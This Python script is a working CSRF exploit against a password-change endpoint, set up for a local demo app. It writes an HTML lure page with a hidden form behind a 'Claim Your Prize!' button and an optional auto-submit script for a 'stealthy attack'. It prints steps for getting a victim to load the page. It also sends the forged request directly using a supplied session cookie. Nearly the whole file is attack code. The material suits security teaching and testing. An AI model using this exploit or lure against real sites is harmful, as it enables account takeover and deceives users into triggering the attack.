#!/usr/bin/env python3
"""
CSRF Attack Example for Password Change
This demonstrates how to exploit the CSRF vulnerability in the password change function.
"""

import requests
import sys

def create_csrf_html(target_url, new_password):
    """Create malicious HTML file for CSRF attack"""
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Innocent Website</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    <p>Click the button below to claim your prize!</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="{target_url}/change_password" method="post" style="display: none;">
        <input type="hidden" name="new_password" value="{new_password}">
        <input type="hidden" name="confirm_password" value="{new_password}">
    </form>
    
    <!-- Visible button that triggers the form -->
    <button onclick="document.getElementById('csrf-form').submit();">Claim Your Prize!</button>
    
    <!-- Auto-submit version (uncomment for stealthy attack) -->
    <!--
    <script>
        window.onload = function() {{
            document.getElementById('csrf-form').submit();
        }}
    </script>
    -->
    
    <p><strong>Security Note:</strong> This is a CSRF attack demonstration. 
       If a user is logged into the vulnerable app and visits this page, 
       their password will be changed!</p>
</body>
</html>"""
    
    with open('csrf_attack.html', 'w') as f:
        f.write(html_content)
    
    print("[+] CSRF attack HTML file created: csrf_attack.html")
    print("[+] Instructions:")
    print("    1. Make sure target is logged into the vulnerable app")
    print("    2. Host this HTML file (python -m http.server 8080)")
    print("    3. Get victim to visit http://localhost:8080/csrf_attack.html")
    print("    4. Victim's password will be changed!")

def test_csrf_directly(target_url, session_cookie, new_password):
    """Test CSRF vulnerability directly with requests"""
    headers = {
        'Cookie': f'session={session_cookie}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'new_password': new_password,
        'confirm_password': new_password
    }
    
    try:
        response = requests.post(f'{target_url}/change_password', 
                               headers=headers, data=data, 
                               allow_redirects=False)
        
        if response.status_code == 302 or "Password changed" in response.text:
            print("[+] CSRF attack successful!")
            print(f"[+] Password changed to: {new_password}")
        else:
            print("[-] CSRF attack failed")
            print(f"[-] Response: {response.text}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target_url = "http://localhost:5000"
    new_password = "hacked123"
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "html":
            create_csrf_html(target_url, new_password)
        elif sys.argv[1] == "direct" and len(sys.argv) > 2:
            session_cookie = sys.argv[2]
            test_csrf_directly(target_url, session_cookie, new_password)
        else:
            print("Usage:")
            print("  python csrf_exploit.py html                    # Create HTML file")
            print("  python csrf_exploit.py direct <session_cookie> # Direct attack")
    else:
        create_csrf_html(target_url, new_password)
